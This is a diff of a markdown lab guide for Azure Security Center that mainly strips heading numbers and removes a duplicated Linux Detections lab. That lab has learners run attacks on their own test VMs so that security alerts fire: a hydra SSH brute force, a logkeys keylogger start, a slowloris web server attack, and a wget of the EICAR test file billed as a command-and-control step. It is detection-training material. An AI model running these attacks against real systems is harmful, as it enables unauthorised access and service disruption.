@@ -4016,7 +4016,7 @@ The example above is based on Container security monitoring (you have a lab that
 
 This lab covers ASC Policy and Regulatory Compliance and guides you through some preview features.<br>
 
-### 1 - Regulatory Compliance (Preview)
+### Regulatory Compliance (Preview)
 Open a new browser tab/window and copy and paste the following URL in your browser to get access to the Regulatory Compliance preview:
 
 ```txt
@@ -4047,7 +4047,7 @@ This exercise remediates a failed assessment for PCI DSS 3.2
 4. Give your new Network Security Group (NSG) a name and click on **OK** This adds a new NSG
 5. This will resolve your failed assessment on the next scan
 
-### 2 - Policy Management
+### Policy Management
 This exercise guides you through the current Security Center policies and is intended for exploration purposes only. <br>
 
 ***Note**: at this time we only support out-of-the-box Security Center policies. Support for custom policies is coming in the near future*
@@ -4071,7 +4071,7 @@ This exercise guides you through the current Security Center policies and is int
 ---
 
 ===
-# 04 - VM Protection with Just in Time (JIT) access
+# VM Protection with Just in Time (JIT) access
 ##### Estimated lab time: 15 minutes
 
 ***Requirements**:*<br>
@@ -4082,7 +4082,7 @@ Make sure before continuing with this lab that:
 In this lab you will protect your VMs with Just-In-Time (JIT) access. JIT has been released, but in this lab we will show you an additional JIT feature, showcasing the JIT integration with Azure<br>
 ***Note: the steps below are showcasing a preview feature which needs to be executed using a feature flag***
 
-### 1 - Enable JIT on a VM in ASC
+### Enable JIT on a VM in ASC
 1. Open the Azure portal using this <a href="https://ms.portal.azure.com/?feature.canmodifystamps=true&feature.jitconnect=true" target="_blank">link </a>, or copy and paste this URL:
 ```html
 https://ms.portal.azure.com/?feature.canmodifystamps=true&feature.jitconnect=true
@@ -4100,7 +4100,7 @@ https://ms.portal.azure.com/?feature.canmodifystamps=true&feature.jitconnect=tru
 9. Click on the button **Request access**
 10. When you have the proper permission, access will be granted and you can now connect to the VM
 
-### 2 - Enable JIT on a VM from the Virtual Machine blade
+### Enable JIT on a VM from the Virtual Machine blade
 1. In the same browser session, navigate to the **Virtual Machine** blade
 2. Select a VM for which you have not enabled JIT
 3. Click on **Connect** in the Overview blade
@@ -4115,7 +4115,7 @@ https://ms.portal.azure.com/?feature.canmodifystamps=true&feature.jitconnect=tru
 !IMAGE[alt text](\Media\JitActiveNow.png
 )
 
-### 3 - [Optional Lab] Enable custom JIT ports with PowerShell
+### [Optional Lab] Enable custom JIT ports with PowerShell
 ***Requirements**:*<br>
 Navigate to **Module 08 - Automation with PowerShell** and make sure that you have completed **Labs 01 - 
 AzureRm PowerShell cmdlets installation and 02 - 
@@ -4141,13 +4141,13 @@ Set-AzureRmJitNetworkAccessPolicy -ResourceGroupName "<rescourceGroupName>" -Loc
 ---
 
 ===
-# 05 - Linux Detections
+# Linux Detections
 ##### Estimated lab time: 25 minutes
 *The following lab is based on the* <a href="https://gallery.technet.microsoft.com/Azure-Security-Center-0ac8a5ef" target="_blank">Linux Detections playbook</a> *written by Yuri Diogenes. This playbook provides a more comphrensive explanation than is covered in this lab*<br>
 
 In this lab we will explore the new Linux detection's in ASC by executing attacks in a Kali Linux VM that you are going to deploy. You will connect to your deployed Linux VM (Linux-0) leveraging SSH. In case you don't have a SSH client installed, you can install the free edition of MobaXterm <a href="https://mobaxterm.mobatek.net/download.html" target="_blank">here</a>.<br>
 
-#### 1 - Create a Kali Linux VM
+#### Create a Kali Linux VM
 ***Note**: time to create the Kali Linux VM is approx 3 minutes. Make sure to add a port that enables you to connect.*
 1. In the Azure portal, click on **Create a resource** and search for **Kali Linux** and **create** the VM
 
@@ -4155,7 +4155,7 @@ In this lab we will explore the new Linux detection's in ASC by executing attack
 
 ***Note**: you don't have to wait until the deployment is complete. Proceed with the next exercise*
 
-#### 2 - Create Linux users 
+#### Create Linux users 
 1. Connect to your Linux VM (Linux-0) that you have deployed earlier (note: not the Kali VM), using your favorite SSH tool
 2. Create 5 users with the names user1, user2, user3, user4, user5, by leveraging the following Linux command <br>
 ***Note**: Replace "userName" by user1, user2, etc.<br> Set the password to "mypassword1" for user1, "mypassword2" for user2, etc.*
@@ -4165,7 +4165,7 @@ sudo adduser <userName>
 ```
 
 
-#### 4 - Executing a brute force attack
+#### Executing a brute force attack
 1. Connect to the Kali Linux VM with SSH (ensure that your VM deployment in step 1 was successful)
 2. Navigate to the folder **/usr/share/wordlists**
 3. Upload the **<a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_users.txt" target="_blank">lab_users.txt</a>** and **<a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_pass.txt" target="_blank">lab_pass.txt</a>** files to this folder by executing:
@@ -4183,14 +4183,14 @@ hydra -I -L lab_users.txt -P lab_pass.txt <IP> -t 4 ssh
 ```
 6.  Wait until it finishes, and the result should show you the username and the password that was found
 
-#### 5 - Simulate capturing credentials and other useful information
+#### Simulate capturing credentials and other useful information
 1.  Run the command below in the Linux Victim VM to simulate an attacker that is trying to start logkeys to set up the system to capture credentials and other useful information: 
 ```text
 logkeys --start
 ```
 ***Note**:<br> Ignore the error message if you don't have logkeys installed. Security Center will detect this attack anyway*
 
-#### 6 - Simulate an attack against a web server
+#### Simulate an attack against a web server
 Assuming that the attacker has already performed some internal recon using nmap, you are going to simulate an attack against a web server
 1. Run the command below in the Linux Victim VM:
 ```text
@@ -4198,7 +4198,7 @@ perl slowloris.pl -dns server.contoso.com
 ```
 ***Note**:<br> Ignore the error message if you don't have this script on your system. Security Center will detect this attack anyway*
 
-#### 7 - Command & Control (C2) simulation
+#### Command & Control (C2) simulation
 Attackers usually will communicate with command and control (C2) to transfer data or to download more  malicious software.
 For this example, you will download the EICAR malware test file using WGET for the IP address.  The commands that follows must be executed in the Linux Victim VM:<br><br>
 
@@ -4212,88 +4212,7 @@ wget http://XXX.XXX.XXX.XXX/download/eicar.com
 ```
 ***Note**:<br>  if you have issues download eicar.com, try download eicar.txt (same command line, just change the extension).*
 
-#### 8 - Review Security Center alerts
-1. Navigate to the **Security Center>Security Alerts** blade (under Threat Protection)
-2.  Organize the alerts by date by clicking on the Date column, and review the alerts that were generated during this lab, it should look similar like this:
-
-!IMAGE[alt text](\Media\Security_incident_detected_Linux.png)
-
-!IMAGE[alt text](\Media\Security_incident_detected_Linux2.png)
-
-<br><br>
-### Continue with the next lab
-06 - Logic Apps integration, click <a href="https://github.com/tianderturpijn/Azure-Security-Center/tree/master/Labs/06%20-%20Logic%20App%20integration" target="_blank">here</a># 05 - Linux Detections
-##### Estimated lab time: 25 minutes
-*The following lab is based on the* <a href="https://gallery.technet.microsoft.com/Azure-Security-Center-0ac8a5ef" target="_blank">Linux Detections playbook</a> *written by Yuri Diogenes. This playbook provides a more comphrensive explanation than is covered in this lab*<br>
-
-In this lab we will explore the new Linux detection's in ASC by executing attacks in a Kali Linux VM that you are going to deploy. You will connect to your deployed Linux VM (Linux-0) leveraging SSH. In case you don't have a SSH client installed, you can install the free edition of MobaXterm <a href="https://mobaxterm.mobatek.net/download.html" target="_blank">here</a>.<br>
-
-#### 1 - Create a Kali Linux VM
-***Note**: time to create the Kali Linux VM is approx 3 minutes. Make sure to add a port that enables you to connect.*
-1. In the Azure portal, click on **Create a resource** and search for **Kali Linux** and **create** the VM
-
-!IMAGE[alt text](\Media\kali_marketplace.png)
-
-***Note**: you don't have to wait until the deployment is complete. Proceed with the next exercise*
-
-#### 2 - Create Linux users 
-1. Connect to your Linux VM (Linux-0) that you have deployed earlier (note: not the Kali VM), using your favorite SSH tool
-2. Create 5 users with the names user1, user2, user3, user4, user5, by leveraging the following Linux command <br>
-***Note**: Replace "userName" by user1, user2, etc.<br> Set the password to "mypassword1" for user1, "mypassword2" for user2, etc.*
-
-```powershell
-sudo adduser <userName>
-```
-
-
-#### 4 - Executing a brute force attack
-1. Connect to the Kali Linux VM with SSH (ensure that your VM deployment in step 1 was successful)
-2. Navigate to the folder **/usr/share/wordlists**
-3. Upload the **<a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_users.txt" target="_blank">lab_users.txt</a>** and **<a href="https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_pass.txt" target="_blank">lab_pass.txt</a>** files to this folder by executing:
-```text
-sudo wget https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_users.txt
-```
-and
-```text
-sudo wget https://raw.githubusercontent.com/tianderturpijn/Azure-Security-Center/master/Labs/05%20-%20Linux%20Detections/Files/lab_pass.txt
-```
-4. Copy the IP address from the Linux Victim VM that you have deployed earlier. We are going to brute force attack this VM
-5.  Type the command below in your Kali VM, and replace "**IP**" with **yourLinuxVM** public IP address
-```text
-hydra -I -L lab_users.txt -P lab_pass.txt <IP> -t 4 ssh
-```
-6.  Wait until it finishes, and the result should show you the username and the password that was found
-
-#### 5 - Simulate capturing credentials and other useful information
-1.  Run the command below in the Linux Victim VM to simulate an attacker that is trying to start logkeys to set up the system to capture credentials and other useful information: 
-```text
-logkeys --start
-```
-***Note**:<br> Ignore the error message if you don't have logkeys installed. Security Center will detect this attack anyway*
-
-#### 6 - Simulate an attack against a web server
-Assuming that the attacker has already performed some internal recon using nmap, you are going to simulate an attack against a web server
-1. Run the command below in the Linux Victim VM:
-```text
-perl slowloris.pl -dns server.contoso.com
-```
-***Note**:<br> Ignore the error message if you don't have this script on your system. Security Center will detect this attack anyway*
-
-#### 7 - Command & Control (C2) simulation
-Attackers usually will communicate with command and control (C2) to transfer data or to download more  malicious software.
-For this example, you will download the EICAR malware test file using WGET for the IP address.  The commands that follows must be executed in the Linux Victim VM:<br><br>
-
-1. First, obtain the IP address of the target:
-```text
-nslookup eicar.com 
-```
-2. Now replace the XXX.XXX.XXX.XXX on the command below with the IP obtained from nslookup: 
-```text
-wget http://XXX.XXX.XXX.XXX/download/eicar.com
-```
-***Note**:<br>  if you have issues download eicar.com, try download eicar.txt (same command line, just change the extension).*
-
-#### 8 - Review Security Center alerts
+#### Review Security Center alerts
 1. Navigate to the **Security Center>Security Alerts** blade (under Threat Protection)
 2.  Organize the alerts by date by clicking on the Date column, and review the alerts that were generated during this lab, it should look similar like this:
 
@@ -4307,14 +4226,14 @@ wget http://XXX.XXX.XXX.XXX/download/eicar.com
 ---
 
 ===
-# 06 - Logic Apps integration
+# Logic Apps integration
 ##### Estimated lab time: 25 minutes
 In this lab you are going to explore the Security Center integration with Logic Apps.<br>
 ***Note**: More comprehensive guidance can be found* <a href="https://techcommunity.microsoft.com/t5/Security-Identity/Automate-Azure-Security-Center-actions-with-Playbooks-and/td-p/264843" target="_blank">here</a>.
 
 The most asked automation integration use case is how Security Center integrates with ITSM solutions like ServiceNow, so in this lab we are going to explore exactly that integration.<br><br>
 
-#### 1 - Create an ASC test alert
+#### Create an ASC test alert
 ***Note**: if you want to run more validation steps to simulate attacks in VMs/Computers monitored by Azure Security Center (out of scope for this lab)* <a href="https://gallery.technet.microsoft.com/Azure-Security-Center-549aa7a4" target="_blank">go here</a><br>
 
 Before you are going to create the playbook, let's make sure that we have an ASC alert we can act upon.
@@ -4400,11 +4319,11 @@ https://dev12345.service-now.com
 ---
 
 ===
-# 07 - Preview Features
+# Preview Features
 ##### Estimated lab time: 15 minutes
 This optional lab points you to a number of preview features for you to explore.
 
-#### 1 - Container Security Monitoring
+#### Container Security Monitoring
 *Note: This exercise also shows you how to use Azure CLI straight from the Azure portal*
 
 1. In the Azure portal click on the **Cloud Shell** icon in the upper right, next to your account, as shown below <br><br>
@@ -4449,7 +4368,7 @@ az container create --resource-group <yourResourceGroupName> --name <yourContain
 ) <br><br>
 ***Note**: It takes some time for the container to become visible in Security Center* <br>
 
-#### 2 - Explore the new Container tab under Compute & Apps
+#### Explore the new Container tab under Compute & Apps
 1. The new container view in Security Center is accessible through a feature flag. Copy and paste the following URL in your Azure portal session:
 ```text
 https://aka.ms/asc_containers_preview
@@ -4475,7 +4394,7 @@ https://aka.ms/asc_containers_preview
 ---
 
 ===
-# 08 - Automation with PowerShell
+# Automation with PowerShell
 
 ##### Estimated lab time: 15 minutes
 In this lab you are going to explore what the ASC automation options with PowerShell are.
@@ -4485,7 +4404,7 @@ You have received an Azure pass or you have a test environment available. Please
 
 For using these labs in combination with Labs On Demand (LOD), open an incognito/in-private browser session on your laptop and login to the Azure portal leveraging the LOD account (like for example admin@ems123456.onmicrosoft.com)<br>
 
-## 1 - AzureRm PowerShell cmdlets installation
+## AzureRm PowerShell cmdlets installation
 1. Navigate to the Azure portal and click on **Virtual machines**
 2. Click on your Windows virtual machine (**Win-0**)
 3. Under **Overview** copy the **Public IP address** of your VM
@@ -4493,7 +4412,7 @@ For using these labs in combination with Labs On Demand (LOD), open an incognito
 5. Open an administrator PowerShell session
 5. Install the AzureRm modules by typing in ***Install-Module -Name AzureRM -Verbose***
 
-## 2 - Security Center PowerShell cmdlets installation
+## Security Center PowerShell cmdlets installation
 Security Center provides automation support through PowerShell as well.<br>
 The ASC PowerShell cmdlets can be downloaded from <a href="https://www.powershellgallery.com/packages/AzureRM.Security/0.2.0-preview" target="_blank">here</a>.<br>
 
@@ -4581,7 +4500,7 @@ A sample which contains how to use the AzureRm.Security module can be found <a h
 ---
 
 ===
-# 09 - Automation with ARM
+# Automation with ARM
 
 ##### Estimated lab time: 15 minutes
 In this lab you are going to explore what the ASC automation options are leveraging Azure Resource Manager (ARM) templates
@@ -4710,7 +4629,7 @@ New-AzureRmDeployment -TemplateFile 'https://raw.githubusercontent.com/tiandertu
 ---
 
 ===
-# 10 - Additional Labs
+# Additional Labs
 This lab contains additional exercises. <br><br>
 
 ### File Integrity Monitoring (FIM)
